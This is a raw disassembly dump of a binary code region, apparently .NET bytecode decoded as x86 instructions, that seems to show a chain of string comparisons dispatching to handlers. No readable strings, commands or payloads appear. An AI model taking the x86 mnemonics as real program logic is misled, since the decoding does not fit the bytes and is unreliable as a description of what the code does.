  403113:	0a 0a                	or     (%edx),%cl
  403115:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  40311b:	00 2a                	add    %ch,(%edx)
  40311d:	00 00                	add    %al,(%eax)
  40311f:	00 01                	add    %al,(%ecx)
  403121:	10 00                	adc    %al,(%eax)
  403123:	00 00                	add    %al,(%eax)
  403125:	00 00                	add    %al,(%eax)
  403127:	00 4e 4e             	add    %cl,0x4e(%esi)
  40312a:	00 0e                	add    %cl,(%esi)
  40312c:	26 00 00             	add    %al,%es:(%eax)
  40312f:	01 22                	add    %esp,(%edx)
  403131:	28 2b                	sub    %ch,(%ebx)
  403133:	00 00                	add    %al,(%eax)
  403135:	06                   	push   %es
  403136:	2b 00                	sub    (%eax),%eax
  403138:	2a 00                	sub    (%eax),%al
  40313a:	00 00                	add    %al,(%eax)
  40313c:	3a 02                	cmp    (%edx),%al
  40313e:	74 09                	je     0x403149
  403140:	00 00                	add    %al,(%eax)
  403142:	1b 28                	sbb    (%eax),%ebp
  403144:	26 00 00             	add    %al,%es:(%eax)
  403147:	06                   	push   %es
  403148:	2b 00                	sub    (%eax),%eax
  40314a:	2a 00                	sub    (%eax),%al
  40314c:	1e                   	push   %ds
  40314d:	02 28                	add    (%eax),%ch
  40314f:	17                   	pop    %ss
  403150:	00 00                	add    %al,(%eax)
  403152:	0a 2a                	or     (%edx),%ch
  403154:	1b 30                	sbb    (%eax),%esi
  403156:	08 00                	or     %al,(%eax)
  403158:	c6 07 00             	movb   $0x0,(%edi)
  40315b:	00 1d 00 00 11 02    	add    %bl,0x2110000
  403161:	28 68 00             	sub    %ch,0x0(%eax)
  403164:	00 06                	add    %al,(%esi)
  403166:	28 60 00             	sub    %ah,0x0(%eax)
  403169:	00 06                	add    %al,(%esi)
  40316b:	7e 0a                	jle    0x403177
  40316d:	00 00                	add    %al,(%eax)
  40316f:	04 15                	add    $0x15,%al
  403171:	16                   	push   %ss
  403172:	28 83 00 00 0a 0a    	sub    %al,0xa0a0000(%ebx)
  403178:	06                   	push   %es
  403179:	16                   	push   %ss
  40317a:	9a 13 13 11 13 72 92 	lcall  $0x9272,$0x13111313
  403181:	03 00                	add    (%eax),%eax
  403183:	70 16                	jo     0x40319b
  403185:	28 4e 00             	sub    %cl,0x0(%esi)
  403188:	00 0a                	add    %cl,(%edx)
  40318a:	16                   	push   %ss
  40318b:	33 2f                	xor    (%edi),%ebp
  40318d:	16                   	push   %ss
  40318e:	80 1a 00             	sbbb   $0x0,(%edx)
  403191:	00 04 72             	add    %al,(%edx,%esi,2)
  403194:	92                   	xchg   %eax,%edx
  403195:	03 00                	add    (%eax),%eax
  403197:	70 7e                	jo     0x403217
  403199:	0a 00                	or     (%eax),%al
  40319b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40319e:	19 00                	sbb    %eax,(%eax)
  4031a0:	00 04 28             	add    %al,(%eax,%ebp,1)
  4031a3:	78 00                	js     0x4031a5
  4031a5:	00 0a                	add    %cl,(%edx)
  4031a7:	28 53 00             	sub    %dl,0x0(%ebx)
  4031aa:	00 0a                	add    %cl,(%edx)
  4031ac:	28 27                	sub    %ah,(%edi)
  4031ae:	00 00                	add    %al,(%eax)
  4031b0:	06                   	push   %es
  4031b1:	16                   	push   %ss
  4031b2:	80 19 00             	sbbb   $0x0,(%ecx)
  4031b5:	00 04 38             	add    %al,(%eax,%edi,1)
  4031b8:	4c                   	dec    %esp
  4031b9:	07                   	pop    %es
  4031ba:	00 00                	add    %al,(%eax)
  4031bc:	11 13                	adc    %edx,(%ebx)
  4031be:	72 9c                	jb     0x40315c
  4031c0:	03 00                	add    (%eax),%eax
  4031c2:	70 16                	jo     0x4031da
  4031c4:	28 4e 00             	sub    %cl,0x0(%esi)
  4031c7:	00 0a                	add    %cl,(%edx)
  4031c9:	16                   	push   %ss
  4031ca:	33 15 28 6a 00 00    	xor    0x6a28,%edx
  4031d0:	06                   	push   %es
  4031d1:	28 84 00 00 0a 16 28 	sub    %al,0x28160a00(%eax,%eax,1)
  4031d8:	24 00                	and    $0x0,%al
  4031da:	00 0a                	add    %cl,(%edx)
  4031dc:	38 27                	cmp    %ah,(%edi)
  4031de:	07                   	pop    %es
  4031df:	00 00                	add    %al,(%eax)
  4031e1:	11 13                	adc    %edx,(%ebx)
  4031e3:	72 a4                	jb     0x403189
  4031e5:	03 00                	add    (%eax),%eax
  4031e7:	70 16                	jo     0x4031ff
  4031e9:	28 4e 00             	sub    %cl,0x0(%esi)
  4031ec:	00 0a                	add    %cl,(%edx)
  4031ee:	16                   	push   %ss
  4031ef:	33 20                	xor    (%eax),%esp
  4031f1:	7e 11                	jle    0x403204
  4031f3:	00 00                	add    %al,(%eax)
  4031f5:	04 18                	add    $0x18,%al
  4031f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4031f8:	85 00                	test   %eax,(%eax)
  4031fa:	00 0a                	add    %cl,(%edx)
  4031fc:	7e 11                	jle    0x40320f
  4031fe:	00 00                	add    %al,(%eax)
  403200:	04 6f                	add    $0x6f,%al
  403202:	7f 00                	jg     0x403204
  403204:	00 0a                	add    %cl,(%edx)
  403206:	16                   	push   %ss
  403207:	28 24 00             	sub    %ah,(%eax,%eax,1)
  40320a:	00 0a                	add    %cl,(%edx)
  40320c:	38 f7                	cmp    %dh,%bh
  40320e:	06                   	push   %es
  40320f:	00 00                	add    %al,(%eax)
  403211:	11 13                	adc    %edx,(%ebx)
  403213:	72 b0                	jb     0x4031c5
  403215:	03 00                	add    (%eax),%eax
  403217:	70 16                	jo     0x40322f
  403219:	28 4e 00             	sub    %cl,0x0(%esi)
  40321c:	00 0a                	add    %cl,(%edx)
  40321e:	16                   	push   %ss
  40321f:	33 0d 16 14 14 28    	xor    0x28141416,%ecx
  403225:	3e 00 00             	add    %al,%ds:(%eax)
  403228:	06                   	push   %es
  403229:	38 da                	cmp    %bl,%dl
  40322b:	06                   	push   %es
  40322c:	00 00                	add    %al,(%eax)
  40322e:	11 13                	adc    %edx,(%ebx)
  403230:	72 c4                	jb     0x4031f6
  403232:	03 00                	add    (%eax),%eax
  403234:	70 16                	jo     0x40324c
  403236:	28 4e 00             	sub    %cl,0x0(%esi)
  403239:	00 0a                	add    %cl,(%edx)
  40323b:	16                   	push   %ss
  40323c:	33 1b                	xor    (%ebx),%ebx
  40323e:	17                   	pop    %ss
  40323f:	06                   	push   %es
  403240:	17                   	pop    %ss
  403241:	9a 06 18 9a 28 86 00 	lcall  $0x86,$0x289a1806
  403248:	00 0a                	add    %cl,(%edx)
  40324a:	28 65 00             	sub    %ah,0x0(%ebp)
  40324d:	00 06                	add    %al,(%esi)
  40324f:	28 3e                	sub    %bh,(%esi)
  403251:	00 00                	add    %al,(%eax)
  403253:	06                   	push   %es
  403254:	38 af 06 00 00 11    	cmp    %ch,0x11000006(%edi)
  40325a:	13 72 d2             	adc    -0x2e(%edx),%esi
  40325d:	03 00                	add    (%eax),%eax
  40325f:	70 16                	jo     0x403277
  403261:	28 4e 00             	sub    %cl,0x0(%esi)
  403264:	00 0a                	add    %cl,(%edx)
  403266:	16                   	push   %ss
  403267:	33 1a                	xor    (%edx),%ebx
  403269:	06                   	push   %es
  40326a:	17                   	pop    %ss
  40326b:	9a 06 18 9a 28 86 00 	lcall  $0x86,$0x289a1806
  403272:	00 0a                	add    %cl,(%edx)
  403274:	28 65 00             	sub    %ah,0x0(%ebp)
  403277:	00 06                	add    %al,(%esi)
  403279:	28 39                	sub    %bh,(%ecx)
  40327b:	00 00                	add    %al,(%eax)
  40327d:	06                   	push   %es
  40327e:	38 85 06 00 00 11    	cmp    %al,0x11000006(%ebp)
  403284:	13 72 d8             	adc    -0x28(%edx),%esi
  403287:	03 00                	add    (%eax),%eax
  403289:	70 16                	jo     0x4032a1
  40328b:	28 4e 00             	sub    %cl,0x0(%esi)
  40328e:	00 0a                	add    %cl,(%edx)
  403290:	16                   	push   %ss
  403291:	33 18                	xor    (%eax),%ebx
  403293:	06                   	push   %es
  403294:	17                   	pop    %ss
  403295:	9a 28 86 00 00 0a 28 	lcall  $0x280a,$0x8628
  40329c:	65 00 00             	add    %al,%gs:(%eax)
  40329f:	06                   	push   %es
  4032a0:	28 3a                	sub    %bh,(%edx)
  4032a2:	00 00                	add    %al,(%eax)
  4032a4:	06                   	push   %es
  4032a5:	26 38 5d 06          	cmp    %bl,%es:0x6(%ebp)
  4032a9:	00 00                	add    %al,(%eax)
  4032ab:	11 13                	adc    %edx,(%ebx)
  4032ad:	72 de                	jb     0x40328d
  4032af:	03 00                	add    (%eax),%eax
  4032b1:	70 16                	jo     0x4032c9
  4032b3:	28 4e 00             	sub    %cl,0x0(%esi)
  4032b6:	00 0a                	add    %cl,(%edx)
  4032b8:	16                   	push   %ss
  4032b9:	33 5d 17             	xor    0x17(%ebp),%ebx
  4032bc:	28 2b                	sub    %ch,(%ebx)
  4032be:	00 00                	add    %al,(%eax)
  4032c0:	0a 20                	or     (%eax),%ah
  4032c2:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4032c5:	00 28                	add    %ch,(%eax)
  4032c7:	2c 00                	sub    $0x0,%al
  4032c9:	00 0a                	add    %cl,(%edx)
  4032cb:	20 0f                	and    %cl,(%edi)
  4032cd:	27                   	daa
  4032ce:	00 00                	add    %al,(%eax)
  4032d0:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  4032d6:	0c 28                	or     $0x28,%al
  4032d8:	23 00                	and    (%eax),%eax
  4032da:	00 0a                	add    %cl,(%edx)
  4032dc:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  4032e2:	00 28                	add    %ch,(%eax)
  4032e4:	87 00                	xchg   %eax,(%eax)
  4032e6:	00 0a                	add    %cl,(%edx)
  4032e8:	1c 28                	sbb    $0x28,%al
  4032ea:	56                   	push   %esi
  4032eb:	00 00                	add    %al,(%eax)
  4032ed:	06                   	push   %es
  4032ee:	06                   	push   %es
  4032ef:	17                   	pop    %ss
  4032f0:	9a 28 1e 00 00 0a 28 	lcall  $0x280a,$0x1e28
  4032f7:	88 00                	mov    %al,(%eax)
  4032f9:	00 0a                	add    %cl,(%edx)
  4032fb:	0b 73 2e             	or     0x2e(%ebx),%esi
  4032fe:	00 00                	add    %al,(%eax)
  403300:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403303:	06                   	push   %es
  403304:	18 9a 07 6f 89 00    	sbb    %bl,0x896f07(%edx)
  40330a:	00 0a                	add    %cl,(%edx)
  40330c:	07                   	pop    %es
  40330d:	28 8a 00 00 0a 26    	sub    %cl,0x260a0000(%edx)
  403313:	38 f0                	cmp    %dh,%al
  403315:	05 00 00 11 13       	add    $0x13110000,%eax
  40331a:	72 e4                	jb     0x403300
  40331c:	03 00                	add    (%eax),%eax
  40331e:	70 16                	jo     0x403336
  403320:	28 4e 00             	sub    %cl,0x0(%esi)
  403323:	00 0a                	add    %cl,(%edx)
  403325:	16                   	push   %ss
  403326:	33 0e                	xor    (%esi),%ecx
  403328:	06                   	push   %es
  403329:	17                   	pop    %ss
  40332a:	9a 16 28 35 00 00 06 	lcall  $0x600,$0x352816
  403331:	38 d2                	cmp    %dl,%dl
  403333:	05 00 00 11 13       	add    $0x13110000,%eax
  403338:	72 f4                	jb     0x40332e
  40333a:	03 00                	add    (%eax),%eax
  40333c:	70 16                	jo     0x403354
  40333e:	28 4e 00             	sub    %cl,0x0(%esi)
  403341:	00 0a                	add    %cl,(%edx)
  403343:	16                   	push   %ss
  403344:	33 0e                	xor    (%esi),%ecx
  403346:	06                   	push   %es
  403347:	17                   	pop    %ss
  403348:	9a 17 28 35 00 00 06 	lcall  $0x600,$0x352817
  40334f:	38 b4 05 00 00 11 13 	cmp    %dh,0x13110000(%ebp,%eax,1)
  403356:	72 04                	jb     0x40335c
  403358:	04 00                	add    $0x0,%al
  40335a:	70 16                	jo     0x403372
  40335c:	28 4e 00             	sub    %cl,0x0(%esi)
  40335f:	00 0a                	add    %cl,(%edx)
  403361:	16                   	push   %ss
  403362:	33 13                	xor    (%ebx),%edx
  403364:	72 1a                	jb     0x403380
  403366:	04 00                	add    $0x0,%al
  403368:	70 16                	jo     0x403380
  40336a:	16                   	push   %ss
  40336b:	15 28 8b 00 00       	adc    $0x8b28,%eax
  403370:	0a 26                	or     (%esi),%ah
  403372:	38 91 05 00 00 11    	cmp    %dl,0x11000005(%ecx)
  403378:	13 72 4a             	adc    0x4a(%edx),%esi
  40337b:	04 00                	add    $0x0,%al
  40337d:	70 16                	jo     0x403395
  40337f:	28 4e 00             	sub    %cl,0x0(%esi)
  403382:	00 0a                	add    %cl,(%edx)
  403384:	16                   	push   %ss
  403385:	33 13                	xor    (%ebx),%edx
  403387:	72 5e                	jb     0x4033e7
  403389:	04 00                	add    $0x0,%al
  40338b:	70 16                	jo     0x4033a3
  40338d:	16                   	push   %ss
  40338e:	15 28 8b 00 00       	adc    $0x8b28,%eax
  403393:	0a 26                	or     (%esi),%ah
  403395:	38 6e 05             	cmp    %ch,0x5(%esi)
  403398:	00 00                	add    %al,(%eax)
  40339a:	11 13                	adc    %edx,(%ebx)
  40339c:	72 8e                	jb     0x40332c
  40339e:	04 00                	add    $0x0,%al
  4033a0:	70 16                	jo     0x4033b8
  4033a2:	28 4e 00             	sub    %cl,0x0(%esi)
  4033a5:	00 0a                	add    %cl,(%edx)
  4033a7:	16                   	push   %ss
  4033a8:	33 13                	xor    (%ebx),%edx
  4033aa:	72 a0                	jb     0x40334c
  4033ac:	04 00                	add    $0x0,%al
  4033ae:	70 16                	jo     0x4033c6
  4033b0:	16                   	push   %ss
  4033b1:	15 28 8b 00 00       	adc    $0x8b28,%eax
  4033b6:	0a 26                	or     (%esi),%ah
  4033b8:	38 4b 05             	cmp    %cl,0x5(%ebx)
  4033bb:	00 00                	add    %al,(%eax)
  4033bd:	11 13                	adc    %edx,(%ebx)
  4033bf:	72 c0                	jb     0x403381
  4033c1:	04 00                	add    $0x0,%al
  4033c3:	70 16                	jo     0x4033db
  4033c5:	28 4e 00             	sub    %cl,0x0(%esi)
  4033c8:	00 0a                	add    %cl,(%edx)
  4033ca:	16                   	push   %ss
  4033cb:	33 11                	xor    (%ecx),%edx
  4033cd:	06                   	push   %es
  4033ce:	17                   	pop    %ss
  4033cf:	9a 16 16 15 28 8b 00 	lcall  $0x8b,$0x28151616
  4033d6:	00 0a                	add    %cl,(%edx)
  4033d8:	26 38 2a             	cmp    %ch,%es:(%edx)
  4033db:	05 00 00 11 13       	add    $0x13110000,%eax
  4033e0:	72 d2                	jb     0x4033b4
  4033e2:	04 00                	add    $0x0,%al
  4033e4:	70 16                	jo     0x4033fc
  4033e6:	28 4e 00             	sub    %cl,0x0(%esi)
  4033e9:	00 0a                	add    %cl,(%edx)
  4033eb:	16                   	push   %ss
  4033ec:	33 42 7e             	xor    0x7e(%edx),%eax
  4033ef:	1d 00 00 04 6f       	sbb    $0x6f040000,%eax
  4033f4:	8c 00                	mov    %es,(%eax)
  4033f6:	00 0a                	add    %cl,(%edx)
  4033f8:	de 0e                	fimuls (%esi)
  4033fa:	25 28 23 00 00       	and    $0x2328,%eax
  4033ff:	0a 0d 28 25 00 00    	or     0x2528,%cl
  403405:	0a de                	or     %dh,%bl
  403407:	00 14 fe             	add    %dl,(%esi,%edi,8)
  40340a:	06                   	push   %es
  40340b:	3b 00                	cmp    (%eax),%eax
  40340d:	00 06                	add    %al,(%esi)
  40340f:	73 73                	jae    0x403484
  403411:	00 00                	add    %al,(%eax)
  403413:	0a 73 74             	or     0x74(%ebx),%dh
  403416:	00 00                	add    %al,(%eax)
  403418:	0a 80 1d 00 00 04    	or     0x400001d(%eax),%al
  40341e:	7e 1d                	jle    0x40343d
  403420:	00 00                	add    %al,(%eax)
  403422:	04 06                	add    $0x6,%al
  403424:	17                   	pop    %ss
  403425:	9a 6f 8d 00 00 0a 38 	lcall  $0x380a,$0x8d6f
  40342c:	d8 04 00             	fadds  (%eax,%eax,1)
  40342f:	00 11                	add    %dl,(%ecx)
  403431:	13 72 e6             	adc    -0x1a(%edx),%esi
  403434:	04 00                	add    $0x0,%al
  403436:	70 16                	jo     0x40344e
  403438:	28 4e 00             	sub    %cl,0x0(%esi)
  40343b:	00 0a                	add    %cl,(%edx)
  40343d:	16                   	push   %ss
  40343e:	33 20                	xor    (%eax),%esp
  403440:	7e 1d                	jle    0x40345f
  403442:	00 00                	add    %al,(%eax)
  403444:	04 6f                	add    $0x6f,%al
  403446:	8c 00                	mov    %es,(%eax)
  403448:	00 0a                	add    %cl,(%edx)
  40344a:	de 0f                	fimuls (%edi)
  40344c:	25 28 23 00 00       	and    $0x2328,%eax
  403451:	0a 13                	or     (%ebx),%dl
  403453:	04 28                	add    $0x28,%al
  403455:	25 00 00 0a de       	and    $0xde0a0000,%eax
  40345a:	00 38                	add    %bh,(%eax)
  40345c:	a8 04                	test   $0x4,%al
  40345e:	00 00                	add    %al,(%eax)
  403460:	11 13                	adc    %edx,(%ebx)
  403462:	72 f8                	jb     0x40345c
  403464:	04 00                	add    $0x0,%al
  403466:	70 16                	jo     0x40347e
  403468:	28 4e 00             	sub    %cl,0x0(%esi)
  40346b:	00 0a                	add    %cl,(%edx)
  40346d:	16                   	push   %ss
  40346e:	33 43 7e             	xor    0x7e(%ebx),%eax
  403471:	1e                   	push   %ds
  403472:	00 00                	add    %al,(%eax)
  403474:	04 6f                	add    $0x6f,%al
  403476:	8c 00                	mov    %es,(%eax)
  403478:	00 0a                	add    %cl,(%edx)
  40347a:	de 0f                	fimuls (%edi)
  40347c:	25 28 23 00 00       	and    $0x2328,%eax
  403481:	0a 13                	or     (%ebx),%dl
  403483:	05 28 25 00 00       	add    $0x2528,%eax
  403488:	0a de                	or     %dh,%bl
  40348a:	00 14 fe             	add    %dl,(%esi,%edi,8)
  40348d:	06                   	push   %es
  40348e:	3c 00                	cmp    $0x0,%al
  403490:	00 06                	add    %al,(%esi)
  403492:	73 73                	jae    0x403507
  403494:	00 00                	add    %al,(%eax)
  403496:	0a 73 74             	or     0x74(%ebx),%dh
  403499:	00 00                	add    %al,(%eax)
  40349b:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  4034a1:	7e 1e                	jle    0x4034c1
  4034a3:	00 00                	add    %al,(%eax)
  4034a5:	04 06                	add    $0x6,%al
  4034a7:	17                   	pop    %ss
  4034a8:	9a 6f 8d 00 00 0a 38 	lcall  $0x380a,$0x8d6f
  4034af:	55                   	push   %ebp
  4034b0:	04 00                	add    $0x0,%al
  4034b2:	00 11                	add    %dl,(%ecx)
  4034b4:	13 72 10             	adc    0x10(%edx),%esi
  4034b7:	05 00 70 16 28       	add    $0x28167000,%eax
  4034bc:	4e                   	dec    %esi
  4034bd:	00 00                	add    %al,(%eax)
  4034bf:	0a 16                	or     (%esi),%dl
  4034c1:	33 20                	xor    (%eax),%esp
  4034c3:	7e 1e                	jle    0x4034e3
  4034c5:	00 00                	add    %al,(%eax)
  4034c7:	04 6f                	add    $0x6f,%al
  4034c9:	8c 00                	mov    %es,(%eax)
  4034cb:	00 0a                	add    %cl,(%edx)
  4034cd:	de 0f                	fimuls (%edi)
  4034cf:	25 28 23 00 00       	and    $0x2328,%eax
  4034d4:	0a 13                	or     (%ebx),%dl
  4034d6:	06                   	push   %es
  4034d7:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  4034dd:	00 38                	add    %bh,(%eax)
  4034df:	25 04 00 00 11       	and    $0x11000004,%eax
  4034e4:	13 72 26             	adc    0x26(%edx),%esi
  4034e7:	05 00 70 16 28       	add    $0x28167000,%eax
  4034ec:	4e                   	dec    %esi
  4034ed:	00 00                	add    %al,(%eax)
  4034ef:	0a 16                	or     (%esi),%dl
  4034f1:	33 1e                	xor    (%esi),%ebx
  4034f3:	72 26                	jb     0x40351b
  4034f5:	05 00 70 7e 0a       	add    $0xa7e7000,%eax
  4034fa:	00 00                	add    %al,(%eax)
  4034fc:	04 28                	add    $0x28,%al
  4034fe:	61                   	popa
  4034ff:	00 00                	add    %al,(%eax)
  403501:	06                   	push   %es
  403502:	28 53 00             	sub    %dl,0x0(%ebx)
  403505:	00 0a                	add    %cl,(%edx)
  403507:	28 27                	sub    %ah,(%edi)
  403509:	00 00                	add    %al,(%eax)
  40350b:	06                   	push   %es
  40350c:	38 f7                	cmp    %dh,%bh
  40350e:	03 00                	add    (%eax),%eax
  403510:	00 11                	add    %dl,(%ecx)
  403512:	13 72 32             	adc    0x32(%edx),%esi
  403515:	05 00 70 16 28       	add    $0x28167000,%eax
  40351a:	4e                   	dec    %esi
  40351b:	00 00                	add    %al,(%eax)
  40351d:	0a 16                	or     (%esi),%dl
  40351f:	33 6a 1f             	xor    0x1f(%edx),%ebp
  403522:	25 28 8e 00 00       	and    $0x8e28,%eax
  403527:	0a 72 3e             	or     0x3e(%edx),%dh
  40352a:	05 00 70 28 1e       	add    $0x1e287000,%eax
  40352f:	00 00                	add    %al,(%eax)
  403531:	0a 13                	or     (%ebx),%dl
  403533:	07                   	pop    %es
  403534:	1d 8d 23 00 00       	sbb    $0x238d,%eax
  403539:	01 13                	add    %edx,(%ebx)
  40353b:	14 11                	adc    $0x11,%al
  40353d:	14 16                	adc    $0x16,%al
  40353f:	72 32                	jb     0x403573
  403541:	05 00 70 a2 11       	add    $0x11a27000,%eax
  403546:	14 17                	adc    $0x17,%al
  403548:	7e 0a                	jle    0x403554
  40354a:	00 00                	add    %al,(%eax)
  40354c:	04 a2                	add    $0xa2,%al
  40354e:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403551:	28 61 00             	sub    %ah,0x0(%ecx)
  403554:	00 06                	add    %al,(%esi)
  403556:	a2 11 14 19 7e       	mov    %al,0x7e191411
  40355b:	0a 00                	or     (%eax),%al
  40355d:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403560:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  403563:	11 07                	adc    %eax,(%edi)
  403565:	a2 11 14 1b 7e       	mov    %al,0x7e1b1411
  40356a:	0a 00                	or     (%eax),%al
  40356c:	00 04 a2             	add    %al,(%edx,%eiz,4)
  40356f:	11 14 1c             	adc    %edx,(%esp,%ebx,1)
  403572:	11 07                	adc    %eax,(%edi)
  403574:	28 8f 00 00 0a a2    	sub    %cl,-0x5df60000(%edi)
  40357a:	11 14 28             	adc    %edx,(%eax,%ebp,1)
  40357d:	82 00 00             	addb   $0x0,(%eax)
  403580:	0a 28                	or     (%eax),%ch
  403582:	27                   	daa
  403583:	00 00                	add    %al,(%eax)
  403585:	06                   	push   %es
  403586:	38 7d 03             	cmp    %bh,0x3(%ebp)
  403589:	00 00                	add    %al,(%eax)
  40358b:	11 13                	adc    %edx,(%ebx)
  40358d:	72 64                	jb     0x4035f3
  40358f:	05 00 70 16 28       	add    $0x28167000,%eax
  403594:	4e                   	dec    %esi
  403595:	00 00                	add    %al,(%eax)
  403597:	0a 16                	or     (%esi),%dl
  403599:	40                   	inc    %eax
  40359a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40359b:	00 00                	add    %al,(%eax)
  40359d:	00 06                	add    %al,(%esi)
  40359f:	17                   	pop    %ss
  4035a0:	9a 06 18 9a 28 90 00 	lcall  $0x90,$0x289a1806
  4035a7:	00 0a                	add    %cl,(%edx)
  4035a9:	1b 8d 23 00 00 01    	sbb    0x1000023(%ebp),%ecx
  4035af:	13 14 11             	adc    (%ecx,%edx,1),%edx
  4035b2:	14 16                	adc    $0x16,%al
  4035b4:	72 72                	jb     0x403628
  4035b6:	05 00 70 a2 11       	add    $0x11a27000,%eax
  4035bb:	14 17                	adc    $0x17,%al
  4035bd:	7e 0a                	jle    0x4035c9
  4035bf:	00 00                	add    %al,(%eax)
  4035c1:	04 a2                	add    $0xa2,%al
  4035c3:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  4035c6:	28 61 00             	sub    %ah,0x0(%ecx)
  4035c9:	00 06                	add    %al,(%esi)
  4035cb:	a2 11 14 19 7e       	mov    %al,0x7e191411
  4035d0:	0a 00                	or     (%eax),%al
  4035d2:	00 04 a2             	add    %al,(%edx,%eiz,4)
  4035d5:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  4035d8:	72 84                	jb     0x40355e
  4035da:	05 00 70 a2 11       	add    $0x11a27000,%eax
  4035df:	14 28                	adc    $0x28,%al
  4035e1:	82 00 00             	addb   $0x0,(%eax)
  4035e4:	0a 28                	or     (%eax),%ch
  4035e6:	27                   	daa
  4035e7:	00 00                	add    %al,(%eax)
  4035e9:	06                   	push   %es
  4035ea:	de 52 25             	ficoms 0x25(%edx)
  4035ed:	28 23                	sub    %ah,(%ebx)
  4035ef:	00 00                	add    %al,(%eax)
  4035f1:	0a 13                	or     (%ebx),%dl
  4035f3:	08 1b                	or     %bl,(%ebx)
  4035f5:	8d 23                	lea    (%ebx),%esp
  4035f7:	00 00                	add    %al,(%eax)
  4035f9:	01 13                	add    %edx,(%ebx)
  4035fb:	14 11                	adc    $0x11,%al
  4035fd:	14 16                	adc    $0x16,%al
  4035ff:	72 b2                	jb     0x4035b3
  403601:	05 00 70 a2 11       	add    $0x11a27000,%eax
  403606:	14 17                	adc    $0x17,%al
  403608:	7e 0a                	jle    0x403614
  40360a:	00 00                	add    %al,(%eax)
  40360c:	04 a2                	add    $0xa2,%al
  40360e:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403611:	28 61 00             	sub    %ah,0x0(%ecx)
  403614:	00 06                	add    %al,(%esi)
  403616:	a2 11 14 19 7e       	mov    %al,0x7e191411
  40361b:	0a 00                	or     (%eax),%al
  40361d:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403620:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  403623:	11 08                	adc    %ecx,(%eax)
  403625:	6f                   	outsl  %ds:(%esi),(%dx)
  403626:	91                   	xchg   %eax,%ecx
  403627:	00 00                	add    %al,(%eax)
  403629:	0a a2 11 14 28 82    	or     -0x7dd7ebef(%edx),%ah
  40362f:	00 00                	add    %al,(%eax)
  403631:	0a 28                	or     (%eax),%ch
  403633:	27                   	daa
  403634:	00 00                	add    %al,(%eax)
  403636:	06                   	push   %es
  403637:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  40363d:	00 38                	add    %bh,(%eax)
  40363f:	c5 02                	lds    (%edx),%eax
  403641:	00 00                	add    %al,(%eax)
  403643:	11 13                	adc    %edx,(%ebx)
  403645:	72 c4                	jb     0x40360b
  403647:	05 00 70 16 28       	add    $0x28167000,%eax
  40364c:	4e                   	dec    %esi
  40364d:	00 00                	add    %al,(%eax)
  40364f:	0a 16                	or     (%esi),%dl
  403651:	33 0f                	xor    (%edi),%ecx
  403653:	72 c4                	jb     0x403619
  403655:	05 00 70 28 27       	add    $0x27287000,%eax
  40365a:	00 00                	add    %al,(%eax)
  40365c:	06                   	push   %es
  40365d:	38 a6 02 00 00 11    	cmp    %ah,0x11000002(%esi)
  403663:	13 72 ce             	adc    -0x32(%edx),%esi
  403666:	05 00 70 16 28       	add    $0x28167000,%eax
  40366b:	4e                   	dec    %esi
  40366c:	00 00                	add    %al,(%eax)
  40366e:	0a 16                	or     (%esi),%dl
  403670:	33 40 06             	xor    0x6(%eax),%eax
  403673:	80 1b 00             	sbbb   $0x0,(%ebx)
  403676:	00 04 06             	add    %al,(%esi,%eax,1)
  403679:	17                   	pop    %ss
  40367a:	9a 28 64 00 00 06 2d 	lcall  $0x2d06,$0x6428
  403681:	19 72 dc             	sbb    %esi,-0x24(%edx)
  403684:	05 00 70 7e 0a       	add    $0xa7e7000,%eax
  403689:	00 00                	add    %al,(%eax)
  40368b:	04 06                	add    $0x6,%al
  40368d:	17                   	pop    %ss
  40368e:	9a 28 53 00 00 0a 28 	lcall  $0x280a,$0x5328
  403695:	27                   	daa
  403696:	00 00                	add    %al,(%eax)
  403698:	06                   	push   %es
  403699:	2b 12                	sub    (%edx),%edx
  40369b:	06                   	push   %es
  40369c:	17                   	pop    %ss
  40369d:	9a 28 64 00 00 06 28 	lcall  $0x2806,$0x6428
  4036a4:	65 00 00             	add    %al,%gs:(%eax)
  4036a7:	06                   	push   %es
  4036a8:	28 30                	sub    %dh,(%eax)
  4036aa:	00 00                	add    %al,(%eax)
  4036ac:	06                   	push   %es
  4036ad:	38 56 02             	cmp    %dl,0x2(%esi)
  4036b0:	00 00                	add    %al,(%eax)
  4036b2:	11 13                	adc    %edx,(%ebx)
  4036b4:	72 f2                	jb     0x4036a8
  4036b6:	05 00 70 16 28       	add    $0x28167000,%eax
  4036bb:	4e                   	dec    %esi
  4036bc:	00 00                	add    %al,(%eax)
  4036be:	0a 16                	or     (%esi),%dl
  4036c0:	33 26                	xor    (%esi),%esp
  4036c2:	06                   	push   %es
  4036c3:	18 9a 28 86 00 00    	sbb    %bl,0x8628(%edx)
  4036c9:	0a 13                	or     (%ebx),%dl
  4036cb:	09 06                	or     %eax,(%esi)
  4036cd:	17                   	pop    %ss
  4036ce:	9a 11 09 28 63 00 00 	lcall  $0x0,$0x63280911
  4036d5:	06                   	push   %es
  4036d6:	26 11 09             	adc    %ecx,%es:(%ecx)
  4036d9:	28 65 00             	sub    %ah,0x0(%ebp)
  4036dc:	00 06                	add    %al,(%esi)
  4036de:	28 30                	sub    %dh,(%eax)
  4036e0:	00 00                	add    %al,(%eax)
  4036e2:	06                   	push   %es
  4036e3:	38 20                	cmp    %ah,(%eax)
  4036e5:	02 00                	add    (%eax),%al
  4036e7:	00 11                	add    %dl,(%ecx)
  4036e9:	13 72 08             	adc    0x8(%edx),%esi
  4036ec:	06                   	push   %es
  4036ed:	00 70 16             	add    %dh,0x16(%eax)
  4036f0:	28 4e 00             	sub    %cl,0x0(%esi)
  4036f3:	00 0a                	add    %cl,(%edx)
  4036f5:	16                   	push   %ss
